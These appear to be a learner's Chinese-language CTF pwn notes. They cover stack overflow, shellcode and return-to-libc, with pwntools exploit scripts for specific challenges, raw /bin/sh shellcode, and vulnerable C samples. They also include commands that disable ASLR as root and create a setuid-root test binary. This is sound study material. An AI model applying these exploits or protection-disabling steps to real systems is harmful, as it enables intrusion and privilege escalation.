### hint
- ida快捷键 
  - 提取数据 shift + E
  - 查找strings alt + T
  - 打开strings窗口 shift + F12
- 对于合起来的长字符，右键点一下data会按字节转换成几个
- db: 1个字节单元，dw: 2个字节单元，dd: 4个字节单元
- system函数：何时需要填补return地址
  - 第一种，溢出后的返回地址是system的地址，也就是plt表中system的地址   
    `payload = 'a' * (0x88 + 4) + p32(system_addr) + p32(return_addr) + p32(binsh_addr)`  
  - 第二种，溢出后的返回地址是call system的地址，这是程序中出现过的调用system的地址   
    `payload = 'a' * (0x88 + 4) + p32(system_addr) + p32(binsh_addr)`  
- 查找函数在plt表中的地址：  
  - `$ objdump -d -j .plt ./pwn | grep system`  
- 当plt表中没有system函数时，可以尝试shellcode（一串可以返回shell的机器指令码）
    ```python
    context.os='Linux'
    context.arch='amd64'
    shellcode = asm(shellcraft.sh())
    # 64位系统也可以直接用下面这个
    shellcode = b'\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05'
    ```
- 查找ret地址：
  - `ROPgadget --binary pwn --only "pop|ret" `
- libc
  - 题目给了libc： `libc=ELF('libc-2.23.so')`  
    题目没给libc，用LibcSearcher自动识别一下：`libc=LibcSearcher('write',write_addr)`  
  - 查找基地址
    ```python
    elf = ELF("./pwn")
    puts_plt = elf.plt['puts']
    puts_got = elf.got['puts']
    ```
  - write函数泄露地址  
    函数原型：  
    ```c
    ssize write(int fd,const void * buf,size_t count);
    ```  
    payload：首先将write_plt作为栈上的调用地址，main作为write_plt函数的返回地址方便下一步循环，1为write的写模式，写入的内容为write_got，写入长度为4字节（32位）  
    ```python
    payload=p32(write_plt)+p32(main)+p32(1)+p32(write_got)+p32(4)
    write_addr=u32(p.recv(4))
    ```  
    原理：由于程序中有write函数，因此write装载在plt表中，可以直接用write_plt调用。在程序未调用write前，不会将write装载到got表里，因此需要先调用一次write_plt，装载之后got表里就存储了write的真实地址，再打印这个真实地址出来即可计算基地址。

### 环境
#### checksec
- STACK CANARY 栈保护 不能直接覆盖函数返回地址
- NX 输入的字段不可编译 用ROP绕过
- PIE 类似ASLR地址随机化
- FORTIFY 函数源码保护，read, printf等函数漏洞无法利用

#### gcc
- gcc -no-pie -fno-stack-protector -zexecstack -o testfile 
#### ASLR地址随机化
- 查看目前地址随机化模式(0不启用，1半启用，2启用)： 
`$ cat /proc/sys/kernel/randomize_va_space`  
- 修改ASLR：  
在root下：`# echo 0 > /proc/sys/kernel/randomize_va_space`  
在GDB场景下(默认关闭)：`set disable-randomization on`  
#### NX Bit
- Makes certain areas of memory non executable and makes an executable area, non writable.  
  Example: Data, stack and heap segments are made non executable while text segment is made non writable.


### 例题
#### [ad0465 覆盖变量值](https://adworld.xctf.org.cn/media/file/task/4f2f44c9471d4dc2b59768779e378282)
1. 分析过程  
    查看main函数，查看里面的hello()可疑函数：
    ```c
    __int64 __fastcall main(int a1, char **a2, char **a3)
    {
        alarm(0x3Cu);
        setbuf(stdout, 0LL);
        puts("~~ welcome to ctf ~~     ");
        puts("lets get helloworld for bof");
        read(0, &unk_601068, 0x10uLL);     // 注入点
        if ( dword_60106C == 1853186401 )  // 后门
            sub_400686();
        return 0LL;
    }
    ```
    查看输入点，输入到unk_601068；查看函数sub_400686()，为cat flag
    ```c
    read(0, &unk_601068, 0x10uLL);
    if ( dword_60106C == 1853186401 )
        sub_400686();
    ```
    ```c
    __int64 sub_400686()
    {
        system("cat flag.txt");
        return 0LL;
    }
    ```
    检查对应栈地址，发现dword_60106C就在unk_601068下面，并且unk_601068只占4字节，而read函数读入0x10字节，可以覆盖到dword_60106C
    ```
    .bss:0000000000601068 unk_601068      db    ? ;               ; DATA XREF: main+3B↑o
    .bss:0000000000601069                 db    ? ;
    .bss:000000000060106A                 db    ? ;
    .bss:000000000060106B                 db    ? ;
    .bss:000000000060106C dword_60106C    dd ?                    ; DATA XREF: main+4A↑r
    ```
2. exp.py
    ```python
    from pwn import *
    io = process('./pwn')
    val = p64(1853186401)           # 64位的程序，需要注入的数字（使dword_60106C=1853186401）
    payload = b'a'*4 + val         # 4位填充到unk_601068，溢出为val
    io.sendline(payload)
    io.interactive()
    ```
#### [ad0472 输入/bin/sh](https://adworld.xctf.org.cn/media/file/task/53c24fc5522e4a8ea2d9ad0577196b2f)
1. 分析过程
   查看main函数：
   ```c
   char *hello()
    {
        __int16 *v0; // eax
        int v1; // ebx
        unsigned int v2; // ecx
        __int16 *v3; // eax
        __int16 s; // [esp+12h] [ebp-26h] BYREF
        int v6; // [esp+14h] [ebp-24h] BYREF

        v0 = &s;
        v1 = 30;
        if ( ((unsigned __int8)&s & 2) != 0 )
        {
            s = 0;
            v0 = (__int16 *)&v6;
            v1 = 28;
        }
        v2 = 0;
        do
        {
            *(_DWORD *)&v0[v2 / 2] = 0;
            v2 += 4;
        }
        while ( v2 < (v1 & 0xFFFFFFFC) );
        v3 = &v0[v2 / 2];
        if ( (v1 & 2) != 0 )
            *v3++ = 0;
        if ( (v1 & 1) != 0 )
            *(_BYTE *)v3 = 0;
        puts("please tell me your name");
        fgets(name, 50, stdin);
        puts("hello,you can leave some message here:");
        return gets((char *)&s);
        }
   ```
   忽略前面一堆没用的东西，直接看最后几行
   ```c
    puts("please tell me your name");
    fgets(name, 50, stdin);    // 将输入值存在name变量里面
    puts("hello,you can leave some message here:");
    return gets((char *)&s);   // 注入点
    ```
    并且查到一个后门system调用：
    ```c
    int pwn()
    {
        return system("echo hehehe");
    }
    ```
    直接查找plt表中system的地址，查到system地址为0x08048420：
    ```shell
    └─$ objdump -d -j .plt ./pwn | grep system
    08048420 <system@plt>:
    ```
    思路很清晰，将/bin/sh输入到name里面，然后s覆盖返回地址为system调用地址，同时传入name为system调用参数。  
    检查name、s对应栈地址，name的地址在bss段0x0804A080，s需要0x26+0x4（32位）覆盖到r（返回地址）
    ```
    .bss:0804A080 name            db 34h dup(?)
    ```
    ```
    -00000026 s               dw ?
    -00000024                 db ? ; undefined
    ...
    -00000001                 db ? ; undefined
    +00000000  s              db 4 dup(?)
    +00000004  r              db 4 dup(?)
    +00000008
    +00000008 ; end of stack variables
    ```
2. exp.py
    ```python
    from pwn import *
    io = process('./pwn')
    io.recvuntil(b"please tell me your name")
    io.sendline(b"/bin/sh")          # 输入/bin/sh到name
    binsh_addr = 0x0804A080          # 没开地址随机化，找到name变量地址
    system_addr = 0x08048420         # plt表中pwn的调用地址
    payload = b"a" * (0x26+0x4) + p32(system_addr) + p32(0) + p32(binsh_addr)
                                     # 参考上面的system注入公式
    io.recvuntil(b"hello,you can leave some message here:")
    io.sendline(payload)
    io.interactive()
    ```   
#### shellcode
1.  分析过程
    查看main函数：
    ```c
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
        __int64 buf[2]; // [rsp+0h] [rbp-10h] BYREF
        buf[0] = 0LL;
        buf[1] = 0LL;
        setvbuf(_bss_start, 0LL, 1, 0LL);
        printf("Write to here [%p]\n", buf);    // 直接给了buf的地址
        puts("Input anything : ");
        read(0, buf, 0x400uLL);                 // 注入点
        return 0;
    }   
    ```
    查看没有system函数，也没有后面字符串，但是NX没开，可以输入shellcode  
    查看buf的栈结构，发现buf和r之间只有0x10+0x8位，可以溢出覆盖返回地址，但是不足以塞下shellcode，于是考虑将shellcode塞在r后面，将返回地址塞在返回地址后面，返回地址的值用buf地址+增量0x10+0x8+0x8计算得出。
    ```
    -0000000000000010 buf             dq ?
    -0000000000000008 var_8           dq ?
    +0000000000000000  s              db 8 dup(?)
    +0000000000000008  r              db 8 dup(?)
    +0000000000000010 ; 将shellcod塞在这里（但是为什么能塞得下我还不清楚）
    +0000000000000010 ; end of stack variables
    ```
2. exp.py
    ```python
    from pwn import *
    io = process('./pwn')
    io.recvuntil(b"Welcome to SDCCTF 2023 Final!\n")
    buf_addr = io.recvline(keepends=False)      
    buf_addr = buf_addr[len("Write to here ["):-1].decode("ascii")  # 把接收到的byte格式地址转换成string
    buf_addr = int(buf_addr, 16)                                    # 转换16进制string为数字
    ret_addr = buf_addr + (0x10+0x8+0x8)                            # 返回地址 = buf地址+增量，包含r长度
    shellcode = b'\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05'
    payload = b"a"*(0x10+0x8) + p64(ret_addr) + shellcode           # 填充位 + 返回地址 + shellcode，填充位不包含r长度
    io.recvuntil(b"Input anything : \n")
    io.sendline(payload)
    io.interactive() 
    ```

### [基础教程](https://sploitfun.wordpress.com/2015/)
#### 1.1 Stack  Buffer Overflow
不知道为什么无法复现，在root关掉ASLR的情况下跑Python2有问题，但是在GDB里面好像随机化依旧生效  
1. 源码vuln.c
    ```c
    //vuln.c
    #include <stdio.h>
    #include <string.h>

    int main(int argc, char* argv[]) {
        /* [1] */ char buf[256];
        /* [2] */ strcpy(buf,argv[1]);
        /* [3] */ printf("Input:%s\n",buf);
        return 0;
    }
    ```
2. 编译出可执行文件vuln，要加上-m32以编译成32位文件
    ```bash
    (root) echo 0 > /proc/sys/kernel/randomize_va_space
    $ gcc -m32 -g -fno-stack-protector -z execstack -o vuln vuln.c
    $ sudo chown root vuln | sudo chgrp root vuln | sudo chmod +s vuln
    ```
3. GDB查看
    ```bash
    $ gdb -q vuln
        - Reading symbols from ...
    (gdb) disassemble /*function_name*/
        - 查看汇编
    (gdb) r `python2 -c 'print "A"*300'`
        - Segmentation fault
    (gdb) p/x $eip
        - 查看寄存器，但是这里没办法复现
    ```
4. 计算地址  
    他的layout图嘎了，暂且没搞懂是怎么算的，确实不会

- 附 汇编录寄存器：  
  1. EIP寄存器里存储的是CPU下次要执行的指令的地址。也就是调用完fun函数后，让CPU知道应该执行main函数中的printf（"函数调用结束"）语句了。
  2. EBP寄存器里存储的是是栈的栈底指针，通常叫栈基址，这个是一开始进行fun()函数调用之前，由ESP传递给EBP的。（在函数调用前你可以这么理解：ESP存储的是栈顶地址，也是栈底地址。）
  3. ESP寄存器里存储的是在调用函数fun()之后，栈的栈顶。并且始终指向栈顶。
#### 1.2 Integer Overflow
应该和1.1同样，基础题，在电脑没关随机化之类的情况下啥也干不了
1. 源码vuln.c  
    和栈溢出类似，不过多了一次输入字节长度检查。但是可以利用整数溢出，例如本题中unsigned char变量passwd_len上限是256，那么当输入的字节长度为261时，发生溢出，passwd_len变为5，借此可以绕过长度检查，对下面进行栈溢出。
    ```c
    //vuln.c
    #include <stdio.h>
    #include <string.h>
    #include <stdlib.h>

    void store_passwd_indb(char* passwd) {
    }

    void validate_uname(char* uname) {
    }

    void validate_passwd(char* passwd) {
        char passwd_buf[11];
        unsigned char passwd_len = strlen(passwd); /* [1] */ 
        if(passwd_len >= 4 && passwd_len <= 8) { /* [2] */
            printf("Valid Password\n"); /* [3] */ 
            fflush(stdout);
            strcpy(passwd_buf,passwd); /* [4] */
        } else {
            printf("Invalid Password\n"); /* [5] */
            fflush(stdout);
        }
        store_passwd_indb(passwd_buf); /* [6] */
    }

    int main(int argc, char* argv[]) {
        if(argc!=3) {
            printf("Usage Error:   \n");
            fflush(stdout);
            exit(-1);
        }
        validate_uname(argv[1]);
        validate_passwd(argv[2]);
        return 0;
    }
    ```
#### 1.3 Off-By-One
1. 源码vuln.c  
    当source string length == destination buffer length会产生Off-By-One，原理是when EBP is located just above the destination buffer then after strcpy, a single NULL byte would have overwritten EBP.  
    这个暂时没看懂，待回头重看 
    ```c
    //vuln.c
    #include <stdio.h>
    #include <string.h>

    void foo(char* arg);
    void bar(char* arg);

    void foo(char* arg) {
        bar(arg); /* [1] */
    }

    void bar(char* arg) {
        char buf[256];
        strcpy(buf, arg); /* [2] */
    }

    int main(int argc, char *argv[]) {
        if(strlen(argv[1])>256) { /* [3] */
            printf("Attempted Buffer Overflow\n");
            fflush(stdout);
            return -1;
        }
        foo(argv[1]); /* [4] */
        return 0;
    }
    ```
#### 2.1 NX return-to-libc
1. 源码vuln.c
    ```c
    //vuln.c
    #include <stdio.h>
    #include <string.h>

    int main(int argc, char* argv[]) {
        char buf[256]; /* [1] */ 
        strcpy(buf,argv[1]); /* [2] */
        printf("%s\n",buf); /* [3] */
        fflush(stdout);  /* [4] */
        return 0;
    }
    ```
2. 原理
   NX bit can be bypassed using an attack technique called **return-to-libc**. Here return address is overwritten with a particular libc function address (instead of stack address containing the shellcode). 不能直接执行输入system(/bin/sh)，在栈里输入/bin/sh然后在libc；里调用已有的system()函数。
#### 2.2 NX chained return-to-libc
1. 源码vuln.c
   在用户交互前使用退出root权限，即使被攻破也不能更改系统文件
   ```c
    //vuln.c
    #include <stdio.h>
    #include <string.h>

    int main(int argc, char* argv[]) {
    char buf[256];
    seteuid(getuid()); /* Temporarily drop privileges */
    strcpy(buf,argv[1]);
    printf("%s",buf);
    fflush(stdout);
    return 0;
    }
   ```
2. 原理
   链式调用libc，获得seteuid(0)
